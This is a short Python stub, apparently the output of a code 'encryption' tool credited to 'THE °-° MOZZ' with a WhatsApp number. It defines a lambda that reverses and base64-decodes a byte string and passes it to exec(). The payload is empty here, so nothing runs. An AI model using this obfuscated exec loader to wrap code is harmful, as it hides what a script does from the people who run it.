# Encrypted By 『THE °-° MOZZ』 
# Whatsapp : +923114584424
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b''))